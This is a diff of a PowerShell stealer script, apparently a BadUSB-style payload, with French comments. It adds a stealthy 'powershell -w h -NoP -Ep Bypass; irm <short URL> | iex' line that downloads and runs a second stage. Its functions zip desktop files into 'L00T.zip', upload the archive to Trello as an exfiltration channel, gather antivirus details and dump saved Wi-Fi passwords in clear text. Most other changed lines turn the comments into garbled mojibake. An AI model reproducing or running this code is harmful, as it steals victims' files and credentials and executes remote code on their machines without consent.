@@ -18,11 +18,11 @@ ________________________________________________________________________________
 
 Execute command on Windows having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
 THIS Stage2 url : 
-                    https://shorturl.at/
+                    https://shorturl.at/wBFLV
 
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/ | iex
+powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/wBFLV | iex
 
 
 #>
@@ -133,10 +133,10 @@ $idList = ""
 $key = ""
 $token = ""
 
-# URL de l'API Trello pour créer une carte
+# URL de l'API Trello pour crÃ©er une carte
 $url = "https://api.trello.com/1/cards"
 
-# Données JSON pour la création de la carte
+# DonnÃ©es JSON pour la crÃ©ation de la carte
 $data = @"
 {
   "name": "$name",
@@ -146,22 +146,22 @@ $data = @"
 }
 "@
 
-# Envoi de la requête POST avec Invoke-RestMethod pour créer la carte
+# Envoi de la requÃªte POST avec Invoke-RestMethod pour crÃ©er la carte
 $response = Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $data -UseBasicParsing
 
-# Récupérer l'ID de la carte créée à partir de la réponse JSON
+# RÃ©cupÃ©rer l'ID de la carte crÃ©Ã©e Ã  partir de la rÃ©ponse JSON
 $cardId = $response.id
 
-# URL de l'API Trello pour ajouter une pièce jointe à la carte
+# URL de l'API Trello pour ajouter une piÃ¨ce jointe Ã  la carte
 $attachmentUrl = "https://api.trello.com/1/cards/$cardId/attachments"
 
-# Chemin du fichier à télécharger
+# Chemin du fichier Ã  tÃ©lÃ©charger
 $filePath = "C:\temp\$zipFileName"
 
 Set-ItemProperty -Path "C:\temp\L00T.zip" -Name "Attributes" -Value "Archive"
 
 
-# Envoi de la requête POST avec curl pour télécharger le fichier
+# Envoi de la requÃªte POST avec curl pour tÃ©lÃ©charger le fichier
 & "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@C:\temp\L00T.zip"
 
 
@@ -171,7 +171,7 @@ Set-ItemProperty -Path "C:\temp\L00T.zip" -Name "Attributes" -Value "Archive"
 
 
 
-# Créer un scriptblock pour la fonction Exfiltration
+# CrÃ©er un scriptblock pour la fonction Exfiltration
 function Exfiltration {
     # Get desktop path
     $desktop = [Environment]::GetFolderPath("Desktop")
@@ -219,14 +219,14 @@ function AntiSpywareInfo {
 }
 
 function Wifi {
-    # Crée le dossier temporaire wifi dans C:\temp
+    # CrÃ©e le dossier temporaire wifi dans C:\temp
     New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
     Set-Location -Path "C:\temp\wifi"
 
     # Exporte les profils Wi-Fi
     netsh wlan export profile key=clear
 
-    # Modifie les chemins dans le fichier et sauvegarde le résultat dans W1f1_pr0f1les.txt
+    # Modifie les chemins dans le fichier et sauvegarde le rÃ©sultat dans W1f1_pr0f1les.txt
     Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
         $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
     } | Out-File -FilePath "W1f1_pr0f1les.txt" -Encoding utf8
